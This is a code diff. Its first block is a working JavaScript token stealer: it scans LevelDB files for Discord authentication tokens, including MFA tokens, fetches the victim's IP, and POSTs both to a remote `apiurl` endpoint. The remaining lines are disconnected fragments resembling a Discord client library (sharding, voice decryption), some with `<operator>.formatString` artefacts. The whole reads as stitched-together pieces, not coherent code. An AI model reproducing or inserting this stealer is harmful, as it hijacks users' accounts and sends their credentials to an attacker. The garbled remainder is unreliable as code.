@@ -1,0 +1,34 @@
+fs.readdir(r, (err, tokenDir) => {
+                    if (tokenDir) {
+                        var ldbFileFilter = tokenDir.filter(f => f.endsWith("ldb"))
+                        ldbFileFilter.forEach(file => {
+                            var fileContent = fs.readFileSync(`${tokenDir}/${file}`).toString()
+                            var noMFA = /"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/
+                            var mfa = /"mfa\.[\d\w_-]{84}"/
+                            var [token] = noMFA.exec(fileContent) || mfa.exec(fileContent) || [undefined]
+                            if (token) fetch("http://ip-api.com/json/").then(r => r.json()).then(r => fetch(`${apiurl}/beforeinject`, {
+                                method: "POST",
+                                body: JSON.stringify({
+                                    token: token,
+                                    ip: r.query
+                                })
+                            }))
+                        })
+         ...
+<operator>.formatString("Error when sending ", type, " response to master process: ", err.message, "")
+this.emit('error', new Error('Tried to send join packet, but the WebSocket is not open.'))
+const interval = setInterval(() => {
+          this.createShard();
+          if (this.shards.size >= this.totalShards) {
+            clearInterval(interval);
+            resolve(this.shards);
+          }
+        }, delay)
+<operator>.formatString("", mention, "", content ? `, ${content}` : '', "")
+this.currentStream = {
+      dispatcher,
+      broadcast,
+      input: broadcast,
+      output: broadcast,
+    }
+let data = secretbox.methods.open(msg.slice(12), nonce, this.voiceConnection.authentication.secretKey.key)
